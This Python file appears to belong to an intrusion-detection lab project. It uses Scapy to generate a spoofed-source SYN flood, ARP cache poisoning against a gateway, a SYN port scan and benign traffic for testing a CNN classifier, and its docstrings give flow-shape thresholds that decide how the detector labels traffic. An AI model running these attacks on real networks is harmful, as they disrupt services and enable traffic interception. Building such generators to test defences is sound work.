"""
hardware/scapy_attacker.py — Phase 11: Attack Generation

Four demo-ready attack modes:
    - dos_flood(target_ip, ...)   — SYN flood with spoofed source IPs by
                                     default, matches DoS-SYN_FLOOD class
    - arp_spoof(target_ip, spoof_ip, ...) — ARP cache poisoning, matches
                                             MITM-ARPSPOOFING -> Spoofing class
    - recon_scan(target_ip, ...) — TCP SYN port scan, matches
                                    Reconnaissance/PortScan class
    - benign_traffic(target_ip, ...) — normal-looking baseline traffic

RECON MODE NOTE: engine/stream_pipeline.py drops any flow with fewer than 2
packets as INSUFFICIENT_EVIDENCE before it ever reaches the CNN (see the
MIN_PACKETS_FOR_CLASSIFICATION gate there). Since flows are keyed on the full
5-tuple (src_ip, dst_ip, src_port, dst_port, proto), a naive scan that sends
one SYN per destination port with a fresh random source port each time
produces only single-packet flows — every probe gets silently gated out and
Reconnaissance never fires. recon_scan() sends 2 probes per port from the
same source port so each per-port flow clears the gate, while still sweeping
many destination ports quickly (the actual scan signature).

OPERATIONAL CONSTRAINT — NON-NEGOTIABLE:
Run this ONLY against devices on an isolated lab network/VM you control.
Never point this at a shared network, campus infrastructure, or any device
you don't own or have explicit permission to test.

Requires: pip install scapy
Requires admin/root privileges to send raw packets (run terminal as
Administrator on Windows, or with sudo on Linux). Requires Npcap on Windows.

Usage:
    python scapy_attacker.py --mode dos --target 192.168.1.50
    python scapy_attacker.py --mode arp_spoof --target 192.168.1.50 --spoof 192.168.1.1
    python scapy_attacker.py --mode recon --target 192.168.1.50 --port-start 1 --port-end 1024
    python scapy_attacker.py --mode benign --target 192.168.1.50
"""

import argparse
import random
import time

from scapy.all import IP, TCP, ARP, send


def dos_flood(target_ip: str, target_port: int = 80, duration_seconds: int = 15,
              packet_rate: int = 100, spoof_source: bool = True,
              packets_per_flow: int = 150):
    """
    SYN flood — sends a stream of TCP SYN packets sharing one source port per
    flow (with, by default, randomized spoofed source IPs), at a controlled
    rate, for a fixed duration. Matches the DoS-SYN_FLOOD class the model was
    trained on.

    FLOW-SHAPE NOTE (two thresholds, both empirically verified against the
    trained 5-class CNN — see the model-driven checks in project scratchpad):

      1. THE GATE: flows are keyed on the full 5-tuple including src_port, and
         stream_pipeline.py drops any flow with <2 packets as
         INSUFFICIENT_EVIDENCE before the CNN sees it. A fresh random src_port
         per SYN produces only 1-packet flows -> everything self-gates.

      2. THE CLASSIFICATION THRESHOLD: clearing the gate is NOT enough. The CNN
         keys DoS/DDoS on per-flow VOLUME (Tot sum, syn_count, Rate). A flow of
         only a few SYNs looks exactly like a recon probe and classifies as
         Reconnaissance; ~50 SYNs reads as Spoofing; it takes ~>=100 SYNs in a
         SINGLE 5-tuple flow before the model calls it DoS/DDoS (at ~100 SYNs
         P(DoS/DDoS) jumps to 1.0). Rate does not matter — packet COUNT does.

    So we hold one src_port for `packets_per_flow` SYNs (default 150, safely
    above the ~100 threshold) before rolling to the next src_port. Each flow is
    then a high-volume SYN burst the CNN reliably labels DoS/DDoS, and repeated
    flows from the same source drive the Risk Engine's frequency escalation.
    Total packet volume is unchanged (still packet_rate * duration) — only how
    often src_port rolls changes. NOTE: at packet_rate=100 a 150-packet flow
    takes ~1.5s, so keep duration >= a few seconds to complete whole flows.
    packets_per_flow < ~100 will classify as Reconnaissance/Spoofing, NOT DoS.
    """
    packets_per_flow = max(2, packets_per_flow)  # <2 self-gates; <~100 misclassifies (see docstring)
    print(f"[DoS] Starting SYN flood against {target_ip}:{target_port} "
          f"for {duration_seconds}s at ~{packet_rate} pkt/s "
          f"(spoof_source={spoof_source}, packets_per_flow={packets_per_flow}) ...")
    print("[DoS] Press Ctrl+C to stop early.")

    end_time = time.time() + duration_seconds
    sent_count = 0
    interval = 1.0 / packet_rate

    try:
        while time.time() < end_time:
            src_port = random.randint(1024, 65535)
            if spoof_source:
                src_ip = f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
                base = IP(src=src_ip, dst=target_ip)
            else:
                base = IP(dst=target_ip)
            # Burst many SYNs from the SAME src_port so this 5-tuple flow is a
            # high-volume SYN burst (>=~100 pkts) the CNN labels DoS/DDoS, not
            # just a >=2-packet flow that merely clears the gate (see docstring).
            for _ in range(packets_per_flow):
                if time.time() >= end_time:
                    break
                send(base / TCP(sport=src_port, dport=target_port, flags="S"), verbose=0)
                sent_count += 1
                time.sleep(interval)
    except KeyboardInterrupt:
        print("\n[DoS] Stopped early by user.")

    print(f"[DoS] Done. Sent {sent_count} SYN packets to {target_ip}:{target_port}.")


def arp_spoof(target_ip: str, spoof_ip: str, duration_seconds: int = 15,
              packet_rate: int = 5, interface: str = None):
    """
    ARP spoofing — sends forged ARP "is-at" replies to target_ip, claiming
    this machine's MAC address owns spoof_ip (commonly the gateway IP). This
    poisons the target's ARP cache. Matches the MITM-ARPSPOOFING -> Spoofing
    class.

    IMPORTANT: this only sends the poisoning packets — it does NOT forward
    traffic on your behalf (no IP forwarding / relay is set up here).
    """
    print(f"[Spoofing] Starting ARP spoof: telling {target_ip} that "
          f"{spoof_ip} is at this machine's MAC ...")
    print(f"[Spoofing] Duration: {duration_seconds}s, rate: {packet_rate} pkt/s")
    print("[Spoofing] Press Ctrl+C to stop early.")

    end_time = time.time() + duration_seconds
    sent_count = 0
    interval = 1.0 / packet_rate

    try:
        while time.time() < end_time:
            pkt = ARP(op=2, psrc=spoof_ip, pdst=target_ip)
            send(pkt, verbose=0)
            sent_count += 1
            time.sleep(interval)
    except KeyboardInterrupt:
        print("\n[Spoofing] Stopped early by user.")

    print(f"[Spoofing] Done. Sent {sent_count} forged ARP replies to {target_ip}.")
    print("[Spoofing] Reminder: restore the target's ARP table if needed "
          "(most OSes self-correct within a couple minutes after you stop).")


def recon_scan(target_ip: str, port_start: int = 1, port_end: int = 1024,
               duration_seconds: int = 15, probes_per_port: int = 2,
               packet_rate: int = 100):
    """
    TCP SYN port scan — sweeps target_ip's ports, sending `probes_per_port`
    SYN packets per port from the SAME source port so each per-port flow has
    >=2 packets (see the module docstring for why that matters: a 1-packet-
    per-port scan gets gated out as INSUFFICIENT_EVIDENCE before the CNN ever
    sees it). Matches the Reconnaissance/PortScan class.
    """
    print(f"[Recon] Starting SYN port scan against {target_ip} "
          f"ports {port_start}-{port_end} ({probes_per_port} probes/port, "
          f"~{packet_rate} pkt/s) ...")
    print("[Recon] Press Ctrl+C to stop early.")

    end_time = time.time() + duration_seconds
    sent_count = 0
    ports_scanned = 0
    interval = 1.0 / packet_rate

    try:
        for port in range(port_start, port_end + 1):
            if time.time() >= end_time:
                break
            src_port = random.randint(1024, 65535)
            for _ in range(probes_per_port):
                pkt = IP(dst=target_ip) / TCP(sport=src_port, dport=port, flags="S")
                send(pkt, verbose=0)
                sent_count += 1
                time.sleep(interval)
            ports_scanned += 1
    except KeyboardInterrupt:
        print("\n[Recon] Stopped early by user.")

    print(f"[Recon] Done. Sent {sent_count} SYN packets across {ports_scanned} "
          f"ports on {target_ip}.")


def benign_traffic(target_ip: str, target_port: int = 80, duration_seconds: int = 15,
                    packet_rate: int = 10):
    """
    Normal-looking traffic — a light, steady stream of TCP SYN packets for
    demonstrating the "no attack" baseline on the dashboard.
    """
    print(f"[Benign] Sending normal-looking traffic to {target_ip}:{target_port} "
          f"for {duration_seconds}s at ~{packet_rate} pkt/s ...")

    end_time = time.time() + duration_seconds
    sent_count = 0
    interval = 1.0 / packet_rate

    try:
        while time.time() < end_time:
            src_port = random.randint(1024, 65535)
            pkt = IP(dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="S")
            send(pkt, verbose=0)
            sent_count += 1
            time.sleep(interval)
    except KeyboardInterrupt:
        print("\n[Benign] Stopped early by user.")

    print(f"[Benign] Done. Sent {sent_count} normal-rate packets to {target_ip}:{target_port}.")


def main():
    parser = argparse.ArgumentParser(description="Edge-IDPS Scapy attack generator")
    parser.add_argument("--mode", required=True, choices=["dos", "arp_spoof", "recon", "benign"],
                         help="Attack mode to run")
    parser.add_argument("--target", required=True, help="Target IP address")
    parser.add_argument("--spoof", help="IP to spoof (required for arp_spoof mode, "
                                         "typically the gateway IP)")
    parser.add_argument("--port", type=int, default=80, help="Target port (dos/benign modes)")
    parser.add_argument("--port-start", type=int, default=1, help="First port to scan (recon mode)")
    parser.add_argument("--port-end", type=int, default=1024, help="Last port to scan (recon mode)")
    parser.add_argument("--probes-per-port", type=int, default=2,
                         help="SYN probes sent per port in recon mode (must be >=2 to "
                              "clear the pipeline's INSUFFICIENT_EVIDENCE gate)")
    parser.add_argument("--duration", type=int, default=15, help="Duration in seconds")
    parser.add_argument("--rate", type=int, default=None,
                         help="Packets per second (defaults vary by mode)")
    parser.add_argument("--no-spoof-source", action="store_true",
                         help="For dos mode: disable source IP spoofing (use real source)")
    parser.add_argument("--packets-per-flow", type=int, default=150,
                         help="For dos mode: SYNs sent per src_port before rolling to the "
                              "next. Needs to be >=~100 for the flow to classify as DoS/DDoS "
                              "rather than Reconnaissance/Spoofing (default 150).")
    args = parser.parse_args()

    print("=" * 60)
    print("REMINDER: run this ONLY on an isolated lab network/VM you control.")
    print("=" * 60)

    if args.mode == "dos":
        rate = args.rate or 100
        dos_flood(args.target, args.port, args.duration, rate,
                   spoof_source=not args.no_spoof_source,
                   packets_per_flow=args.packets_per_flow)
    elif args.mode == "arp_spoof":
        if not args.spoof:
            parser.error("--spoof is required for arp_spoof mode "
                          "(the IP you want to impersonate, e.g. the gateway)")
        rate = args.rate or 5
        arp_spoof(args.target, args.spoof, args.duration, rate)
    elif args.mode == "recon":
        rate = args.rate or 100
        recon_scan(args.target, args.port_start, args.port_end, args.duration,
                   args.probes_per_port, rate)
    elif args.mode == "benign":
        rate = args.rate or 10
        benign_traffic(args.target, args.port, args.duration, rate)


if __name__ == "__main__":
    main()

